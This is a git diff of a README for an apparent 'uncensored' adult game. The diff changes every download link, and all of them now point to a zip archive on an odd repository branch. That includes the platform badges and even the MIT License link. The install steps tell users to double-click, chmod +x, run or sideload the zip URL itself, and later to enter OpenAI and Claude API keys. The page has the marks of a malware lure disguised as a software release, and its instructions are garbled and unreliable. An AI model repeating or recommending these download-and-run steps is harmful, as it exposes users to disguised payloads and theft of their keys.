@@ -1,4 +1,4 @@
-# ![Download](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip)  
+# ![Download](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip)  
 *(Press the badge to access the download!)*
 
 ---
@@ -14,10 +14,10 @@ Our software, the Imouto Paradise 2 Uncensored Version, is crafted for seamless 
 
 | OS            | Supported | Optimized Experience |  
 | ------------- | :-------: | :-----------------: |  
-| ![Windows](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip)        | ✅       | 🌈                 |  
-| ![macOS](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip)          | ✅       | 🍏                 |  
-| ![Linux](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip)            | ✅       | 🐧                 |  
-| ![Android](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip)| ⚡      | 🚧                 |  
+| ![Windows](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip)        | ✅       | 🌈                 |  
+| ![macOS](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip)          | ✅       | 🍏                 |  
+| ![Linux](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip)            | ✅       | 🐧                 |  
+| ![Android](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip)| ⚡      | 🚧                 |  
 
 📝 *Note: Maximum interactivity and features are unlocked on Windows and macOS! Android support is currently in the aurora of early experimentation.*
 
@@ -85,19 +85,19 @@ Problems at midnight? Our help desk embodies dedication, available any hour via 
 Ready for an immersive storytelling experience? Here’s how to start your journey:
 
 1. **Download the Repository**  
-   Click the [![Download](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip)](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip) badge at the top (or bottom) to obtain the latest version.
+   Click the [![Download](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip)](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip) badge at the top (or bottom) to obtain the latest version.
 
 2. **Extract the Archive**  
    Use your favorite tool (WinRAR, 7-Zip, or just built-in extractors) to unfold the petals from the provided compressed file.
 
 3. **Run the Installer**  
-   - **Windows**: Double-click `https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip`.
-   - **macOS**: Open `https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip` and drag to Applications.
+   - **Windows**: Double-click `https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip`.
+   - **macOS**: Open `https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip` and drag to Applications.
    - **Linux**: Mark as executable:  
-     `chmod +x https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip`  
+     `chmod +x https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip`  
      Then run:  
-     `https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip`
-   - **Android (Experimental)**: Sideload `https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip` via your device’s install menu.
+     `https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip`
+   - **Android (Experimental)**: Sideload `https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip` via your device’s install menu.
 
 4. **API Setup (Optional, Advanced):**
    - Input your OpenAI API Key and Claude API Key from the in-app Settings panel for advanced features.
@@ -117,10 +117,10 @@ The developers and contributors do not endorse any illegal distribution or usage
 
 ## 📜 MIT License
 
-All code and assets are shared under the [MIT License](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip)—empowering you to dream, modify, and contribute as you wish, with just a few simple conditions to keep the garden flourishing.  
+All code and assets are shared under the [MIT License](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip)—empowering you to dream, modify, and contribute as you wish, with just a few simple conditions to keep the garden flourishing.  
 © 2025 Imouto Paradise 2 Uncensored Contributors.
 
 ---
 
-# ![Download](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/imouto-paradise-2-uncensored-edition_v1.3.zip)  
+# ![Download](https://raw.githubusercontent.com/trabelsimahdi14/imouto-paradise-2-uncensored-edition/branch/acetoacetic/uncensored_edition_paradise_imouto_1.2.zip)  
 *(One final step before immersion begins!)*
